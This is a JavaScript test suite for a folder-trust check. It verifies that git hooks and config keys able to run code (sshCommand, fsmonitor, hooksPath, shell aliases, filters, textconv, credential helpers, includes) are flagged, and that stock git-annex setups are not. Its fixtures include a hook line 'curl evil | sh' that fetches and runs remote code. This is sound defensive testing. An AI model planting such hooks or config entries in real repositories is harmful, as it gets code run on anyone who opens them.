import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, mkdir, writeFile, chmod } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { findExecVectors, createTrustStore } from '../src/gui/folder-trust.js'

const ANNEX_FILTER = `[filter "annex"]
\tsmudge = git-annex smudge -- %f
\tclean = git-annex smudge --clean -- %f
\tprocess = git-annex filter-process
`
const ANNEX_PRE_COMMIT = '#!/bin/sh\n# automatically configured by git-annex\ngit annex pre-commit .\n'

async function repo({ config = '', hooks = {} } = {}) {
  const dir = await mkdtemp(join(tmpdir(), 'trust-'))
  await mkdir(join(dir, '.git', 'hooks'), { recursive: true })
  await writeFile(join(dir, '.git', 'config'), `[core]\n\tbare = false\n${config}`)
  for (const [name, body] of Object.entries(hooks)) {
    const file = join(dir, '.git', 'hooks', name)
    await writeFile(file, body)
    await chmod(file, 0o755)
  }
  return dir
}

test('a plain repo with sample hooks has nothing that can run code', async () => {
  const dir = await repo({ hooks: { 'pre-commit.sample': '#!/bin/sh\nexit 0\n' } })
  assert.deepEqual(findExecVectors(dir), [])
})

test('the stock git-annex hooks and filter are not flagged', async () => {
  const dir = await repo({ config: ANNEX_FILTER, hooks: { 'pre-commit': ANNEX_PRE_COMMIT } })
  assert.deepEqual(findExecVectors(dir), [])
})

test('a git-annex hook with an extra line is flagged', async () => {
  const dir = await repo({ hooks: { 'pre-commit': `${ANNEX_PRE_COMMIT}curl evil | sh\n` } })
  assert.match(findExecVectors(dir).join('\n'), /hook pre-commit/)
})

test('config keys that run programs are flagged', async () => {
  for (const snippet of [
    '[core]\n\tsshCommand = evil\n',
    '[core]\n\tfsmonitor = touch x\n',
    '[core]\n\thooksPath = /tmp/hooks\n',
    '[alias]\n\tst = !sh -c evil\n',
    '[filter "evil"]\n\tclean = evil\n',
    '[diff "x"]\n\ttextconv = evil\n',
    '[credential]\n\thelper = !evil\n',
    '[include]\n\tpath = ../evil\n'
  ]) {
    const dir = await repo({ config: snippet })
    assert.ok(findExecVectors(dir).length > 0, `not flagged: ${snippet}`)
  }
})

test('a filter named annex with a different command is flagged', async () => {
  const dir = await repo({ config: '[filter "annex"]\n\tsmudge = evil\n' })
  assert.match(findExecVectors(dir).join('\n'), /filter\.annex\.smudge/)
})

test('a .git file pointing at the real git dir is followed', async () => {
  const real = await repo({ hooks: { 'post-commit': '#!/bin/sh\nevil\n' } })
  const wt = await mkdtemp(join(tmpdir(), 'trust-wt-'))
  await writeFile(join(wt, '.git'), `gitdir: ${join(real, '.git')}\n`)
  assert.match(findExecVectors(wt).join('\n'), /hook post-commit/)
})

test('a folder with no .git has no vectors', async () => {
  assert.deepEqual(findExecVectors(await mkdtemp(join(tmpdir(), 'trust-none-'))), [])
})

test('the trust store remembers folders across instances', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'trust-store-'))
  const file = join(dir, 'trusted.json')
  const target = await repo()
  const first = createTrustStore(file)
  assert.equal(first.has(target), false)
  first.add(target)
  assert.equal(createTrustStore(file).has(target), true)
})
